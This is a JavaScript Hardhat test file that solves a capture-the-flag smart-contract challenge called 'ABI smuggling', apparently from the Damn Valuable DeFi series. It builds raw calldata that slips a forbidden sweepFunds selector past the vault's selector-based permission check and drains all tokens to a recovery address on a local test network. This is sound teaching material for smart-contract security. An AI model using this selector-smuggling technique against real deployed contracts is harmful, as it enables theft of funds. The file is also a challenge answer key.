const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    /**
     * @dev
     * Exploit overview
     * 
     * The exploit in this challenge is this little bit of code here is when
     * the AuthorizedExecutor retrieves the selector from the actionData parameter
     * 
     */
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        //  Deployer can sweep
        expect(vault.interface.getSighash("sweepFunds"), "0x85fb709d");
        //  Player can withdraw
        expect(vault.interface.getSighash("withdraw"), "0xd9caed12");

       const attackVault = await vault.connect(player);
       const attackToken = await token.connect(player);
       
        /**
         * Addresses of calldata for exploit
         * 
         * Function Selector: 0x00 
         * Target: 0x04
         * Bytes Location: 0x24
         * Null Byte: 0x44
         * FS Fake: 0x64
         * Bytes Length: 0x84
         * FS real: 0xA4
         * actualdata: 0xA8
         */


        const executeFs = vault.interface.getSighash("execute")
        const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); // address of actual data
        const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
        const fnSelectorFake =  "0xd9caed12".slice(2);
        const fnSelectorReal = "0x85fb709d".slice(2);
        const fnData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 

        const payload = executeFs + 
                        target + 
                        bytesLocation + 
                        ethers.utils.hexZeroPad("0x0", 32).slice(2) +
                        fnSelectorFake + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
                        bytesLength + 
                        fnSelectorReal + 
                        fnData 
        
        console.log("Payload:")
        console.log(payload);

        await player.sendTransaction(
            {
                to: attackVault.address,
                data: payload,
                gasLimit: 1e6
            }
        )
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
